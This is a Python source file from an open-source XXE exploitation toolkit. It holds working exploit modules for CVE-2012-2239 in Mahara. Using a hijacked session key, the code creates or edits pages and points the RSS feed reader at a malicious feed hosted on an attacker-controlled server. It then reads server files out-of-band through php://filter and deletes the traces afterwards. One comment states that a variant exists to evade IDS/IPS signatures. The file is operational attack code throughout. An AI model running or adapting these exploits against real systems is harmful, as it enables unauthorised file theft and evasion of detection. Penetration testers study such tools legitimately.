#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import json
import os
import random
import re
import sys
import urllib

import libdeceitfulhttp
import liboutput
import libxxeexploits

# CVE-2012-2239 - Mahara - Yunusov-Osipov-style exploit using fully out-of-band data retrieval - base class with common functions
class XXEMaharaCVE20122239(libxxeexploits.XXEHTTP):
	
	# options which are required for all of the subclasses
	def AddRequiredOptions(self):
		self.AddNextOption('MaharaURL', 'Mahara URL (e.g. http://targetserver/)', None, True)
		self.AddNextOption('MaharaSessionKey', 'The session key to send with POST requests (can be captured using e.g. OWASP ZAP/Burp Suite, or view source on the page and look for "sesskey" in the JavaScript)', None, True)

	def AddOptionalOptions(self):
		self.AddNextOption('MaharaViewsURIStem', 'Mahara Views URI stem (e.g. view/ for regular users, admin/site/views.php for the administrative site)', 'view/', False)
		self.AddNextOption('MaharaViewsReadEditURIStem', 'Mahara Views Read/Edit URI stem (e.g. view/blocks.php)', 'view/blocks.php', False)
		self.AddNextOption('MaharaViewsReadEditJSONURIStem', 'Mahara Views Read/Edit (JSON) URI stem (e.g. view/blocks.json.php)', 'view/blocks.json.php', False)
		self.AddNextOption('MaharaViewsDeleteURIStem', 'Mahara Views Delete URI stem (e.g. view/delete.php)', 'view/delete.php', False)

	def SetCommonParameters(self):
		self.RequiresSWAMM = True
		self.SWAMMStoredRequestIDRSSFile = self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLength)
		self.SWAMMIDLengthRSSFile = 10
		#self.SWAMMReflectedRSSFileName = '{0}{1}.rss'.format(self.SWAMMReflectedFilePrefix, self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLengthRSSFile))
		self.ResetRSSFileName()
		
	def ResetRSSFileName(self):
		self.SWAMMReflectedRSSFileName = '{0}{1}.rss?{2}={3}'.format(self.SWAMMReflectedFilePrefix, self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLengthRSSFile), self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLengthRSSFile), self.RandomUniqueTextGenerator.GetNextUnusedText(self.SWAMMIDLengthRSSFile))
		
	def UpdateMaharaMessageVariables(self, messageVariables, isSystemEntity):
		# if a file is being requested, base64-encode its contents
		if (isSystemEntity):
			#messageVariables['%URIPREFIX%'] = 'php://filter/read=convert.base64-encode/resource='
			messageVariables['%XXETARGET%'] = 'php://filter/read=convert.base64-encode/resource=' + messageVariables['%XXETARGET%']

		# this exploit requires that the doctype be set to 'rss'
		messageVariables['%DOCTYPE%'] = 'rss'
		return messageVariables

	def GetBaseMaharaHTTPHeaders(self):
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'text/html,application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'application/x-www-form-urlencoded'
		return httpHeaders
		
	def CreateMaharaPage(self, messageVariables, isSystemEntity, httpHeaders, requestBody):		
		targetURL = '{0}{1}'.format(self.GetOptionByName('MaharaURL').CurrentValue, self.GetOptionByName('MaharaViewsURIStem').CurrentValue)
		self.LogDebug('Requesting Mahara page creation via URL "{0}"'.format(targetURL))
		httpHeaders['Referer'] = targetURL
		
		response = self.SendRequest("POST", targetURL, requestBody, httpHeaders)
		
		if (response.ResponseCode != 303):
			errMsg = 'Unable to create a new page in the target Mahara system - please verify that the session key was borrowed from an active session and for a user with this permission'
			self.LogError(errMsg, isFatal = True)
		
		self.LogDebug('Page created')
		return response

	def GetMaharaPageIDFromMaharaURL(self, pageURL):
		pageID = 0
		rxPageID = re.compile("(.*(&|\\?)id=)(?P<pageid>[0-9]{1,32})($|&|[^0-9]).*", re.IGNORECASE)
		m = rxPageID.match(pageURL)
		if not (m):
			errMsg = 'Could not find a Mahara page ID in the URL "{0}"'.format(pageURL)
			self.LogError(errMsg, isFatal = True)
		if (m.group('pageid')):
			mpid = m.group('pageid')
			self.LogDebug('Found page ID "{0}" in the redirect URL'.format(mpid))
			try:
				pageID = int(mpid)
				self.LogDebug('Page ID is a valid integer'.format(mpid))
			except Exception as e:
				errMsg = 'Could not convert "{0}" to an integer'.format(mpid)
				self.LogError(errMsg, isFatal = True)
		else:
			errMsg = 'Could not find a page ID regex group in the response from Mahara'.format(mpid)
			self.LogError(errMsg, isFatal = True)
		return pageID
		
	def CheckMaharaPage(self, pageURL, httpHeaders):
		# follow the redirect and make sure the new page was created correctly
		self.LogDebug('Loading Mahara page "{0}"'.format(pageURL))
		
		response = self.SendRequest("GET", pageURL, '', httpHeaders)
		if (response.ResponseCode != 200):
			errMsg = 'Got a non-successful response code ({0}) when requesting the page "{1}"'.format(response.ResponseCode, pageURL)
			self.LogError(errMsg, isFatal = True)
		return response

	def DeleteMaharaPage(self, httpHeaders, pageID):
		targetURL = '{0}{1}?id={2}'.format(self.GetOptionByName('MaharaURL').CurrentValue, self.GetOptionByName('MaharaViewsDeleteURIStem').CurrentValue, pageID)
		httpHeaders['Referer'] = targetURL
		requestBody = 'submit=Processing+...&sesskey={0}&pieform_deleteview='.format(self.GetOptionByName('MaharaSessionKey').CurrentValue)

		self.LogDebug('Requesting Mahara page deletion via URL "{0}"'.format(targetURL))
		
		responseDelete = self.SendRequest("POST", targetURL, requestBody, httpHeaders)
		
		if (responseDelete.ResponseCode != 303):
			errMsg = 'The page created in the target Mahara system (ID {0}) may not have been successfully deleted after use'.format(pageID)
			self.LogWarning(errMsg)
		
		self.LogDebug('Page deleted')
		return responseDelete

	def GetMaharaBlockInstance(self, httpHeaders, pageID, blockInstanceID, pageURL):
		httpHeaders['Referer'] = pageURL
		httpHeaders['X-Requested-With'] = 'XMLHttpRequest'
		targetURL = '{0}{1}'.format(self.GetOptionByName('MaharaURL').CurrentValue, self.GetOptionByName('MaharaViewsReadEditJSONURIStem').CurrentValue)
		self.LogDebug('Requesting block instance ID {0} from page {1} via URL "{2}"'.format(blockInstanceID, pageID, targetURL))
		requestBody = 'id={0}&change=1&action_configureblockinstance_id_{1}=true&sesskey={2}'.format(pageID, blockInstanceID, self.GetOptionByName('MaharaSessionKey').CurrentValue)
		
		blockResponse = self.SendRequest("POST", targetURL, requestBody, httpHeaders)
		
		if (blockResponse.ResponseCode != 200):
			errMsg = 'Got a non-successful response code ({0}) when requesting block instance ID {1} from page ID {2}'.format(blockResponse.ResponseCode, pageID, blockInstanceID)
			self.LogError(errMsg, isFatal = True)
		if not (blockResponse.Body):
			errMsg = 'No response body returned when requesting block instance ID {0} from page ID {1}'.format(pageID, blockInstanceID)
			self.LogError(errMsg, isFatal = True)

		self.LogDebug('Block obtained successfully: "{0}"'.format(blockResponse.Body))

		# this header is not used for other types of requests
		del httpHeaders['X-Requested-With']
		
		return blockResponse
	
	def ChangeMaharaBlockTypeToRSSFeedReader(self, pageCreateRedirectURL, httpHeaders, pageID):
		httpHeaders['Referer'] = pageCreateRedirectURL
		httpHeaders['X-Requested-With'] = 'XMLHttpRequest'
		targetURL = '{0}{1}'.format(self.GetOptionByName('MaharaURL').CurrentValue, self.GetOptionByName('MaharaViewsReadEditJSONURIStem').CurrentValue)
		self.LogDebug('Requesting block type change to "externalfeed" via URL "{0}"'.format(targetURL))
		requestBody = 'id={0}&change=1&blocktype=externalfeed&action_addblocktype_column_2_order_1=true&sesskey={1}'.format(pageID, self.GetOptionByName('MaharaSessionKey').CurrentValue)
		
		blockTypeChangeResponse = self.SendRequest("POST", targetURL, requestBody, httpHeaders)
		
		if (blockTypeChangeResponse.ResponseCode != 200):
			errMsg = 'Got a non-successful response code ({0}) when changing the block type to "externalfeed"'.format(blockTypeChangeResponse.ResponseCode)
			self.LogError(errMsg, isFatal = True)
		if not (blockTypeChangeResponse.Body):
			errMsg = 'No response body returned from the request to change the block type'
			self.LogError(errMsg, isFatal = True)
			
		self.LogDebug('Block type changed to "externalfeed"')

		# this header is not used for other types of requests
		del httpHeaders['X-Requested-With']
		
		return blockTypeChangeResponse
		
	def GetMaharaBlockInstanceIDFromBlockTypeChangeResponse(self, blockTypeChangeResponse):
		blockInstanceID = 0
		
		rxBlockInstanceID = re.compile('.*( id=\\\\"blockinstance_)(?P<blockinstanceid>[0-9]{1,32})(\\\\").*', flags=re.MULTILINE|re.DOTALL)
		m = rxBlockInstanceID.match(blockTypeChangeResponse.Body)
		if not (m):
			errMsg = 'Could not find a block instance ID in the response from Mahara'
			self.LogError(errMsg, isFatal = True)
		if (m.group('blockinstanceid')):
			mbiid = m.group('blockinstanceid')
			self.LogDebug('Found block instance ID "{0}" in the redirect URL'.format(mbiid))
			try:
				blockInstanceID = int(mbiid)
				self.LogDebug('Block instance ID is a valid integer'.format(mbiid))
			except Exception as e:
				errMsg = 'Could not convert "{0}" to an integer'.format(mbiid)
				self.LogError(errMsg, isFatal = True)
		else:
			errMsg = 'Could not find a block instance ID regex group in the response from Mahara'.format(mpid)
			self.LogError(errMsg, isFatal = True)
		return blockInstanceID
		
	def GetMaharaBlockInstanceIDs(self, pageRequestResponse, regexString):
		self.LogDebug('Getting block instance IDs by regex')
		blockInstanceIDs = []
		#regexString = blockInstanceRegexPrefix + '( id=\\\\"blockinstance_)(?P<blockinstanceid>[0-9]{1,32})(\\\\").*'
		rxBlockInstanceIDs = re.compile(regexString, flags=re.MULTILINE|re.DOTALL)
		matches = liboutput.OutputUtils.GetNamedMatchCollection(rxBlockInstanceIDs, pageRequestResponse.Body)
		if not (matches):
			self.LogDebug('No matching values for block instance ID regex string "{1}"'.format(len(matches), regexString))
			return blockInstanceIDs
		else:
			self.LogDebug('Found {0} matching values for block instance ID regex string "{1}"'.format(len(matches), regexString))
		for m in matches:
			self.LogDebug('Match: "{0}"'.format(m))
			if ('blockinstanceid' in m.keys()):
				newBlockInstanceID = m['blockinstanceid']
				self.LogDebug('Found block instance ID "{0}" in this match'.format(newBlockInstanceID))
				if (newBlockInstanceID in blockInstanceIDs):
					self.LogDebug('Block instance ID "{0}" already exists in the list of results, so it will not be added'.format(newBlockInstanceID))
				else:
					self.LogDebug('Block instance ID "{0}" does not exist yet in the list of results, so it will be added'.format(newBlockInstanceID))
					blockInstanceIDs.append(newBlockInstanceID)
			else:
				self.LogDebug('Did not find a block instance ID in this match')
		self.LogDebug('Found {0} distinct block instance IDs in the text'.format(len(blockInstanceIDs)))		
		return blockInstanceIDs
		
	def GetMaharaRSSFeedReaderBlockInstanceIDs(self, pageRequestResponse):
		#return self.GetMaharaBlockInstanceIDs(pageRequestResponse, '.*bt-externalfeed[^"]*"')
		return self.GetMaharaBlockInstanceIDs(pageRequestResponse, '( id=\\"blockinstance_)(?P<blockinstanceid>[0-9]{1,32})(\\").+blocktype_externalfeed_feed.*')
		
	def GetContentByRegex(self, httpResponse, regexString, matchGroupName):
		self.LogDebug('Getting content by regex')
		result = []
		#regexString = 'input[^>]+instconf_url[^>]+value=\\\\"(?P<feedreaderurl>[^"]+)\\\\"'
		rxContentURLs = re.compile(regexString, flags=re.MULTILINE|re.DOTALL)
		matches = liboutput.OutputUtils.GetNamedMatchCollection(rxContentURLs, httpResponse.Body)
		self.LogDebug('Parsing matches')
		if not (matches):
			self.LogDebug('No matching values for regex string "{1}"'.format(len(matches), regexString))
			return result
		else:
			self.LogDebug('Found {0} matching value(s) for regex string "{1}": "{2}"'.format(len(matches), regexString, matches))
		for m in matches:
			self.LogDebug('Match: "{0}"'.format(m))
			if ('feedreaderurl' in m.keys()):
				newResult = m[matchGroupName]
				self.LogDebug('Found result "{0}" in this match'.format(newResult))
				result.append(newResult)
			else:
				self.LogDebug('Did not find a result in this match')
		self.LogDebug('Found {0} results in the text'.format(len(result)))
		return result
		
	def GetRSSFeedReaderContentURLs(self, feedReaderBlockResponse):
		self.LogDebug('Getting content by regex')
		#regexString = 'input[^>]+instconf_url[^>]+value=\\\\"(?P<feedreaderurl>[^"]+)\\\\"'
		#regexString = 'input[^>]+instconf_url[^>]+value=\\\\"(?P<feedreaderurl>[^"]+\\\\")'
		regexString = 'input[^>]+instconf_url[^>]+value=\\\\"(?P<feedreaderurl>[^"]+)\\\\"'
		result = self.GetContentByRegex(feedReaderBlockResponse, regexString, 'feedreaderurl')
		for i in range(0, len(result)):
			self.LogDebug('Unescaping "{0}"'.format(result[i]))
			#unescaped = result[i].replace('\\"', '')
			#unescaped = json.loads(unescaped)
			unescaped = result[i]
			unescaped = unescaped.decode('string_escape')
			unescaped = unescaped.decode('unicode_escape')
			unescaped = unescaped.replace('\\/', '/')
			self.LogDebug('Unescaped "{0}" to "{1}"'.format(result[i], unescaped))
			result[i] = unescaped
		return result
		
	def StoreYunusovOsipovType2ReflectedXXEBlockInSWAMM(self, messageVariables):
		reflectedFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedXMLFileName)
		self.LogDebug('Using SWAMM URI stem "{0}" to stage Yunusov-Osipov XML fragment - full URL will be "{1}"'.format(self.SWAMMReflectedXMLFileName, reflectedFullURL))
		messageVariables['%SWAMMSTOREDREQUESTID%'] = self.SWAMMReflectedXMLFileName
		
		xmlFragTemplate = self.GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock()
		xmlFrag = self.ActualizeTemplate(xmlFragTemplate, messageVariables)
		
		xmlFragResponse = libdeceitfulhttp.HTTPResponse()
		xmlFragResponse.ResponseCode = 200
		xmlFragResponse.ResponseReason = "OK"
		xmlFragResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xmlFragResponse.Body = xmlFrag
		
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)
		return messageVariables
		
	def StoreXXERSSFeedInSWAMM(self, messageVariables):
		xxeRSS = self.GetModuleDataFile('xxe_rss.txt')
		messageVariables['%YUNUSOVOSIPOVBLOCK%'] = self.GetYunusovOsipovType2MainXXEDefinitionTemplateBlock()
		xxeRSS = self.ActualizeTemplate(xxeRSS, messageVariables)
		xxeRSSResponse = libdeceitfulhttp.HTTPResponse()
		xxeRSSResponse.ResponseCode = 200
		xxeRSSResponse.ResponseReason = "OK"
		xxeRSSResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xxeRSSResponse.Body = xxeRSS
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestIDRSSFile, '/{0}'.format(self.SWAMMReflectedRSSFileName), None, xxeRSSResponse)
		return messageVariables
		
	def PointMaharaRSSFeedReaderToXXEFeed(self, pageCreateRedirectURL, httpHeaders, blockInstanceID, pageID, xxeFeedURL, isNewFeed = True):
		xxeFeedURLEscaped = urllib.quote_plus(xxeFeedURL)
		count = '&count=10'
		ffd = '&full=on'
		newFeed = '1&removeoncancel=1&sure=1'
		if not (isNewFeed):
			ffd = ''
			count = ''
			newFeed = ''
			
		requestBody = 'title=&url={0}{1}{2}&action_configureblockinstance_id_{3}=Processing+...&blockconfig={4}&id={5}&change=1&new={6}&sesskey={7}&pieform_instconf=&pieform_jssubmission=1'.format(xxeFeedURLEscaped, count, ffd, blockInstanceID, blockInstanceID, pageID, newFeed, self.GetOptionByName('MaharaSessionKey').CurrentValue)
		feedReaderUpdateResponse = self.SendRequest("POST", pageCreateRedirectURL, requestBody, httpHeaders)
		if (feedReaderUpdateResponse.ResponseCode != 200):
			errMsg = 'Got a non-successful response code ({0}) when updating the RSS reader to reference the XXE RSS feed stored in SWAMM'.format(feedReaderUpdateResponse.ResponseCode)
			self.LogError(errMsg, isFatal = True)
		return feedReaderUpdateResponse

# CVE-2012-2239 - Mahara - Yunusov-Osipov-style exploit using fully out-of-band data retrieval - page create variation base class
class XXEMaharaCVE20122239PC(XXEMaharaCVE20122239):

	def SendXXEMessageViaPageCreate(self, messageVariables, isSystemEntity, pageCreateRequestBody):
		# pick a new filename to avoid caching problems on the target system
		self.ResetRSSFileName()
		
		messageVariables = self.UpdateMaharaMessageVariables(messageVariables, isSystemEntity)
		httpHeaders = self.GetBaseMaharaHTTPHeaders()
	
		# create the new view/page, then determine its URL and page ID
		requestBody = pageCreateRequestBody

		pageCreateResponse = self.CreateMaharaPage(messageVariables, isSystemEntity, httpHeaders, requestBody)
		pageCreateRedirectURL = self.GetRedirectLocationFrom30X(pageCreateResponse)
		pageID = self.GetMaharaPageIDFromMaharaURL(pageCreateRedirectURL)

		# verify that the new page loads correctly
		self.CheckMaharaPage(pageCreateRedirectURL, httpHeaders)

		# change the block type to externalfeed (RSS viewer) and obtain the blockinstance value
		blockTypeChangeResponse = self.ChangeMaharaBlockTypeToRSSFeedReader(pageCreateRedirectURL, httpHeaders, pageID)
		blockInstanceID = self.GetMaharaBlockInstanceIDFromBlockTypeChangeResponse(blockTypeChangeResponse)

		# create the Yunusov-Osipov block and store it in SWAMM for the malicious XML file to reference
		messageVariables = self.StoreYunusovOsipovType2ReflectedXXEBlockInSWAMM(messageVariables)
		
		# create a malicious RSS feed and store it in SWAMM
		messageVariables = self.StoreXXERSSFeedInSWAMM(messageVariables)
		
		reflectedXXERSSFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedRSSFileName)
		self.LogDebug('XXE RSS feed URL is "{0}"'.format(reflectedXXERSSFullURL))
		
		# update the RSS reader to read content from the XXE feed
		feedReaderUpdateResponse = self.PointMaharaRSSFeedReaderToXXEFeed(pageCreateRedirectURL, httpHeaders, blockInstanceID, pageID, reflectedXXERSSFullURL)

		# retrieve the OOB data from SWAMM
		oobResult = self.SWAMMRetrieveOOBData(messageVariables, httpHeaders, libxxeexploits.ResponseParserSettingsPHP(), feedReaderUpdateResponse)
		
		# delete the OOB data now that it's been retrieved
		self.SWAMMDeleteOOBData(messageVariables, httpHeaders)
		
		# delete the page from Mahara
		responseDelete = self.DeleteMaharaPage(httpHeaders, pageID)
		
		# delete the malicious RSS feed
		self.SWAMMDeleteRequestResponsePairByID(self.SWAMMStoredRequestIDRSSFile)
		
		return oobResult
		
# CVE-2012-2239 - Mahara - Yunusov-Osipov-style exploit using fully out-of-band data retrieval - page create (as admin user) variation
# the distinction between admin/non-admin page creation is not 100% required for functionality
# (regular users can successfully create pages without passing an owning user ID in the request body)
# but it is included so that if someone tries to be clever and develop an IDS/IPS signature for 
# e.g. "Mahara administrative page creation", this module will be capable of evading it
class XXEMaharaCVE20122239PCA(XXEMaharaCVE20122239PC):
	def __init__(self):
		uid = "CVE-2012-2239-PC-A"
		name = "Mahara <= 1.4.3/1.5.2 - CVE-2012-2239 - Yunusov-Osipov-style exploit using fully out-of-band data retrieval (page create/admin user)"
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.AddRequiredOptions()
		self.AddNextOption('MaharaInstitution', 'The "institution" value to pass in the page create request', 'mahara', False)
		self.AddOptionalOptions()
		self.SetCommonParameters()

	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'MaharaURL', 0)
		self.SetRequiredParameter(args, 'MaharaSessionKey', 1)
		self.SetOptionalParameter(args, 'MaharaViewsURIStem', 2)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditURIStem', 3)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditJSONURIStem', 4)
		self.SetOptionalParameter(args, 'MaharaViewsDeleteURIStem', 5)
		self.SetOptionalParameter(args, 'MaharaInstitution', 6)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		pageCreateRequestBody = 'submit=Processing+...&new=1&institution={0}&sesskey={1}&pieform_createview='.format(self.GetOptionByName('MaharaInstitution').CurrentValue, self.GetOptionByName('MaharaSessionKey').CurrentValue)
		return self.SendXXEMessageViaPageCreate(messageVariables, isSystemEntity, pageCreateRequestBody)

# CVE-2012-2239 - Mahara - Yunusov-Osipov-style exploit using fully out-of-band data retrieval - page create (as standard user) variation
class XXEMaharaCVE20122239PCU(XXEMaharaCVE20122239PC):
	def __init__(self):
		uid = "CVE-2012-2239-PC-U"
		name = "Mahara <= 1.4.3/1.5.2 - CVE-2012-2239 - Yunusov-Osipov-style exploit using fully out-of-band data retrieval (page create/standard user)"
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.AddRequiredOptions()
		self.AddNextOption('MaharaUserID', 'The user ID value/number to pass to page-create requests "1" is generally the built-in admin account - should match the session that the session key and cookie were borrowed from', None, True)
		self.AddOptionalOptions()
		self.SetCommonParameters()

	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'MaharaURL', 0)
		self.SetRequiredParameter(args, 'MaharaSessionKey', 1)
		self.SetRequiredParameter(args, 'MaharaUserID', 2)
		self.SetOptionalParameter(args, 'MaharaViewsURIStem', 3)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditURIStem', 4)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditJSONURIStem', 5)
		self.SetOptionalParameter(args, 'MaharaViewsDeleteURIStem', 6)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		pageCreateRequestBody = 'submit=Processing+...&new=1&owner={0}&sesskey={1}&pieform_createview='.format(self.GetOptionByName('MaharaUserID'), self.GetOptionByName('MaharaSessionKey').CurrentValue)
		return self.SendXXEMessageViaPageCreate(messageVariables, isSystemEntity, pageCreateRequestBody)


# CVE-2012-2239 - Mahara - Yunusov-Osipov-style exploit using fully out-of-band data retrieval - modify existing RSS feed reader variation
class XXEMaharaCVE20122239ME(XXEMaharaCVE20122239):
	def __init__(self):
		uid = "CVE-2012-2239-ME"
		name = "Mahara <= 1.4.3/1.5.2 - CVE-2012-2239 - Yunusov-Osipov-style exploit using fully out-of-band data retrieval (modify existing RSS feed reader)"
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.AddRequiredOptions()
		self.AddNextOption('MaharaPageURIStem', 'Mahara URI stem containing an existing RSS feed reader block (e.g. view/view.php?id=43)', None, True)
		self.AddOptionalOptions()
		self.AddNextOption('MaharaRSSBlockID', 'The block ID on the target page which contains an existing RSS feed reader object (will default to the first RSS feed reader found on the page if not explicitly specified)', None, True)
		self.SetCommonParameters()

	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'MaharaURL', 0)
		self.SetRequiredParameter(args, 'MaharaSessionKey', 1)
		self.SetRequiredParameter(args, 'MaharaPageURIStem', 2)
		self.SetOptionalParameter(args, 'MaharaViewsURIStem', 3)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditURIStem', 4)
		self.SetOptionalParameter(args, 'MaharaViewsReadEditJSONURIStem', 5)
		self.SetOptionalParameter(args, 'MaharaViewsDeleteURIStem', 6)
		self.SetOptionalParameter(args, 'MaharaRSSBlockID', 7)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		# pick a new filename to avoid caching problems on the target system
		self.ResetRSSFileName()
		
		messageVariables = self.UpdateMaharaMessageVariables(messageVariables, isSystemEntity)
		httpHeaders = self.GetBaseMaharaHTTPHeaders()
		
		# load the page and make sure it contains at least one RSS feed reader
		existingPageURL = '{0}{1}'.format(self.GetOptionByName('MaharaURL').CurrentValue, self.GetOptionByName('MaharaPageURIStem').CurrentValue)
		self.LogDebug('Verifying that target page "{0}" appears to be valid'.format(existingPageURL))
		existingPageResponse = self.CheckMaharaPage(existingPageURL, httpHeaders)
		
		self.LogDebug('Searching for RSS feed reader block instance IDs in the response')
		rssBlockInstanceIDs = self.GetMaharaRSSFeedReaderBlockInstanceIDs(existingPageResponse)
		self.LogDebug('Found the following {0} RSS feed reader block instance IDs on the page: "{1}"'.format(len(rssBlockInstanceIDs), rssBlockInstanceIDs))
		
		targetBlockInstanceID = self.GetOptionByName('MaharaRSSBlockID').CurrentValue
		useDefaultBlockID = True
		if ((targetBlockInstanceID) and (targetBlockInstanceID.strip() != '')):
			useDefaultBlockID = False
			self.LogDebug('Using user-specified block instance ID of "{0}"'.format(targetBlockInstanceID))
			if (targetBlockInstanceID in rssBlockInstanceIDs):
				self.LogDebug('Block instance ID "{0}" was found in the target page HTML - no issues'.format(targetBlockInstanceID))
			else:
				self.LogWarning('Block instance ID "{0}" was not found in the target page HTML - if this operation fails, please verify that you have specified a valid block instnace ID, or use the default behaviour and leave that parameter out entirely'.format(targetBlockInstanceID))
		else:
			if (len(rssBlockInstanceIDs) < 1):
				self.LogCritical('Could not automatically find any block instance IDs corresponding to RSS feed readers on the target page - please verify that the page contains such an object, and if necessary manually specify the block instance ID', isFatal = True)
			targetBlockInstanceID = rssBlockInstanceIDs[0]
			self.LogDebug('Using first valid block instance ID from the results ({0})'.format(targetBlockInstanceID))
		
		# determine the page ID from the initial URL
		pageID = self.GetMaharaPageIDFromMaharaURL(existingPageURL)
		
		# get the existing feed reader configuration
		existingBlockResponse = self.GetMaharaBlockInstance(httpHeaders, pageID, targetBlockInstanceID, existingPageURL)
		existingFeedReaderURLs = self.GetRSSFeedReaderContentURLs(existingBlockResponse)
		originalFeedReaderURL = None
		if (len(existingFeedReaderURLs) < 1):
			self.LogWarning('Unable to determine the existing RSS feed URL for this feed reader - it will not be reset to the current value after this operation - if there is no existing feed URL set, this warning can be ignored')
		else:
			if (len(existingFeedReaderURLs) > 1):
				self.LogWarning('There were {0} RSS feed URLs obtained when examining the existing feed reader configuration ("{1}") - this most likely indicates that the configuration was parsed incorrectly - you may wish to manually change the feed URL back to one of these values if the default value ("2") appears incorrect'.format(len(existingFeedReaderURLs), existingFeedReaderURLs, existingFeedReaderURLs[0]))
			originalFeedReaderURL = existingFeedReaderURLs[0]
			self.LogInfo('After completion of this operation, the feed reader URL will be reset to its present value of "{0}"'.format(originalFeedReaderURL))
		
		# create the Yunusov-Osipov block and store it in SWAMM for the malicious XML file to reference
		messageVariables = self.StoreYunusovOsipovType2ReflectedXXEBlockInSWAMM(messageVariables)
		
		# create a malicious RSS feed and store it in SWAMM
		messageVariables = self.StoreXXERSSFeedInSWAMM(messageVariables)
		
		reflectedXXERSSFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedRSSFileName)
		self.LogDebug('XXE RSS feed URL is "{0}"'.format(reflectedXXERSSFullURL))
		
		# update the RSS reader to read content from the XXE feed
		feedReaderUpdateResponse = self.PointMaharaRSSFeedReaderToXXEFeed(existingPageURL, httpHeaders, targetBlockInstanceID, pageID, reflectedXXERSSFullURL, isNewFeed = False)

		# retrieve the OOB data from SWAMM
		oobResult = self.SWAMMRetrieveOOBData(messageVariables, httpHeaders, libxxeexploits.ResponseParserSettingsPHP(), feedReaderUpdateResponse)
		
		# delete the OOB data now that it's been retrieved
		self.SWAMMDeleteOOBData(messageVariables, httpHeaders)
		
		# point the feed reader back to its original URL, if that value was stored
		if (originalFeedReaderURL):
			self.LogDebug('Resetting feed reader content URL to its original value of "{0}"'.format(originalFeedReaderURL))
			feedReaderUpdateResponse = self.PointMaharaRSSFeedReaderToXXEFeed(existingPageURL, httpHeaders, targetBlockInstanceID, pageID, originalFeedReaderURL, isNewFeed = False)
			
		# delete the malicious RSS feed
		self.SWAMMDeleteRequestResponsePairByID(self.SWAMMStoredRequestIDRSSFile)
		
		return oobResult
